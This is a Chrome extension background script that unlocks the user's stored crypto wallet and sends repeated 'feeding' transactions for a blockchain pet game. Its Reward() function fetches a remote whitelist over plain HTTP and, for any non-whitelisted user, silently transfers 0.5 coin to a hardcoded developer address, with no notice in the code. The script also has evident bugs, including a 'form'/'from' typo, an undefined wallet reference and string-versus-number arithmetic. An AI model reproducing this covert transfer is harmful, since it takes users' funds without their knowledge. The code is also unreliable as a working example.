console.log("background")

const web3 = new Web3()
const transactions = [];
function sleep() {
    return new Promise(resolve => {
        chrome.storage.sync.get({
            "interval": 5000,
        }, function (result) {
            const interval = result.interval < 1000 ? 1000 : result.interval
            setTimeout(resolve, interval)
        })
    })
}
const TransacationLooper = async function () {
    console.log("TransacationLooper", "begin")
    while (true) {
        const s = await sleep()
        const tx = transactions.shift()
        if (tx == null) {
            console.log("TransacationLooper", "idle")
            continue
        }
        try {
            const resp = await sendTransacation(tx.wallet, tx.to, tx.num)
            tx.onSuccess(resp)
        } catch (err) {
            tx.onError(err)
        }

    }
}
setTimeout(TransacationLooper())
const sendTransacation = function (wallet, to, num) {
    return new Promise((rs, rj) => {
        const from = '0x' + wallet.getAddress().toString('hex')
        console.log("from", from)
        $.ajax({
            type: 'POST',
            url: "https://walletapi.onethingpcs.com/",
            data: JSON.stringify({
                "jsonrpc": "2.0",
                "method": "eth_getTransactionCount",
                "params": [from, "pending"],
                "id": 1
            }),
            contentType: 'application/json',
            success: function (TransactionCount) {
                const txParams = {
                    from: from,
                    to: to,
                    value: web3.toHex(web3.toWei(num)),
                    gasLimit: '0x186a0',
                    gasPrice: '0x174876e800',
                    nonce: TransactionCount.result,
                }
                const tx = new ethereumjs.Tx(txParams)
                tx.sign(wallet.getPrivateKey())
                const serializedTx = tx.serialize()
                const raw = '0x' + serializedTx.toString('hex')
                $.ajax({
                    type: 'POST',
                    url: "https://walletapi.onethingpcs.com/",
                    data: JSON.stringify({
                        "jsonrpc": "2.0",
                        "method": "eth_sendRawTransaction",
                        "params": [raw],
                        "id": 1
                    }),
                    contentType: 'application/json',
                    success: function (Transaction) {
                        rs(Transaction)
                    },
                    error: function (xhr, type) {
                        rj('eth_sendRawTransaction error!')
                    }
                })
            },
            error: function (xhr, type) {
                rj('eth_getTransactionCount error!')
            }
        })
    })
}

const PushTransaction = function (wallet, to, num) {
    return new Promise((rs, rj) => {
        transactions.push({
            wallet: wallet,
            to: to,
            num: num,
            onSuccess: function (msg) {
                rs(msg)
            },
            onError: function (err) {
                rj(err)
            }
        })
    })
}

const whitelist = [
    "0xaadd17e8654172eafa85e744cb920f2ff287f398",
    "0x397a5941e30d0d08e2c29d7b10985e066c34fc57",
    "0xb61ee0b76cc1a3f887dc03cf647321acb5294dc6",
    "0xa4585aeaf6f1728529c238df87243c553f635a84"
]

const GetWhiteList = function () {
    return new Promise((rs, rj) => {
        $.getJSON("http://mxz-upload-public.oss-cn-hangzhou.aliyuncs.com/wkh/whitelist.json", function (resp) {
            rs(resp)
        })
    })
}
const Reward = async function () {
    const from = '0x' + wallet.getAddress().toString('hex')
    const whitelist = await GetWhiteList();
    if (whitelist.indexOf(form) === -1) {
        const Transacation = await PushTransaction(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
        console.log(Transacation)
    }
}
chrome.extension.onRequest.addListener(
    function (request, sender, sendResponse) {
        console.log(request, sender)
        chrome.storage.sync.get({
            "to_address": null,
            "password": null,
            "wallet": null,
        }, function (result) {
            const wallet = ethereumjs.Wallet.fromV3(result.wallet, result.password)
            const from = '0x' + wallet.getAddress().toString('hex')
            const to_address = result.to_address
            const mode = request.mode;
            const limit = request.limit;
            const id = request.id;
            var num = limit.toFixed(0);
            const idNum = Number('0.' + id)
            if (idNum > limit) {
                sendResponse()
                return
            }
            if (mode == "quick") {
                if (num + idNum > limit) {
                    num = num - 1 + idNum
                } else {
                    num = num + idNum
                }
                const looper = async function () {
                    try {
                        const Transacation = await PushTransaction(wallet, to_address, num)
                        console.log(Transacation)

                        console.log("ID", id, "需要喂养", limit, ((limit - num) / idNum).toFixed(0) + "次")
                        for (i = num + idNum; i < limit; i += idNum) {
                            try {
                                const Transacation = await PushTransaction(wallet, to_address, idNum)
                                console.log(Transacation)
                            } catch (err) {
                                throw err
                            }
                        }
                        await Reward()
                    } catch (err) {
                        throw err
                    }
                }
                looper().then(r => { sendResponse() }, e => { sendResponse() })

            } else {
                console.log("ID", id, "需要喂养", limit, (limit / idNum).toFixed(0) + "次")
                const looper = async function () {
                    for (i = idNum; i < limit; i += idNum) {
                        try {
                            const Transacation = await PushTransaction(wallet, to_address, num)
                            console.log(Transacation)
                        } catch (err) {
                            throw err
                        }
                    }
                    await Reward()
                }
                looper().then(r => { sendResponse() }, e => { sendResponse() })
            }
        })
    }
)
chrome.webRequest.onCompleted.addListener(
    function (details) {
        console.log(details)
        chrome.tabs.getSelected(null, function (tab) {
            chrome.storage.sync.get({
                "mode": "value",
                "min": 0.1,
                "kg": false,
            }, function (result) {
                chrome.tabs.sendRequest(tab.id, result, function (response) {
                    console.log(response);
                });
            })

        });
        return true;
    },
    { urls: ["http://api.h.miguan.in/*"] }
)

